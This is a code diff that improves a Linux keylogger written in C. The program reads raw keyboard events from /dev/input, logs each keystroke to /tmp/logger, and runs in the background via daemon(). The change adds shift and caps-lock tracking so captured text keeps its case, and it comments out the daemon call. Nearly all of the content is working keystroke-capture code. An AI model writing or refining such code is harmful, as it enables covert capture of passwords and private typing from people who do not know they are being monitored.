@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <string.h>
+#include <ctype.h>
 
 #define LOG "/tmp/logger"
 
@@ -16,8 +17,7 @@ char keymap[KEY_SPACE + 1] = {
 	[KEY_P] = 'p', [KEY_Q] = 'q', [KEY_R] = 'r',
 	[KEY_S] = 's', [KEY_T] = 't', [KEY_U] = 'u',
 	[KEY_V] = 'v', [KEY_W] = 'w', [KEY_X] = 'x',
-	[KEY_Y] = 'y', [KEY_Z] = 'z',
-	[KEY_SPACE] = ' '
+	[KEY_Y] = 'y', [KEY_Z] = 'z', [KEY_SPACE] = ' ',
 };
 
 int write_file(char character){
@@ -54,6 +54,8 @@ const char *locate_event(){
 	return buffer;
 }
 void read_kbd(){
+	int shift_pressed = 0;
+	int caps_pressed = 0;
 	char path[32] = "/dev/input/";	
 	const char *locate = locate_event();
 	strcat(path, locate);
@@ -69,14 +71,36 @@ void read_kbd(){
 			perror("Error reading event");
 			break;
 		}
-		if(event.type == EV_KEY & event.value == 1){
-			write_file(keymap[event.code]);
+
+		if(event.code == KEY_LEFTSHIFT && event.value == 1){
+			shift_pressed = 1;
+		} else if(event.code == KEY_LEFTSHIFT && event.value == 0){
+		  	shift_pressed = 0;
+		}
+
+		if(event.type == EV_LED && event.code == LED_CAPSL){
+			if(event.value == 1){
+				caps_pressed = 1;
+			} else{
+				caps_pressed = 0;
+			}
+		}
+
+		if(event.type == EV_KEY && event.value == 1){
+			if(shift_pressed == 1 || caps_pressed == 1){
+				char key = keymap[event.code];
+				char upper_case = toupper(key);
+				write_file(upper_case);
+			} else{
+				char key = keymap[event.code];
+				write_file(key);
+			}		
 		}
 	}		    	
 }
 
 
 int main(){
-	int background = daemon(1, 1);
+	//int background = daemon(1, 1);
 	read_kbd();
 }
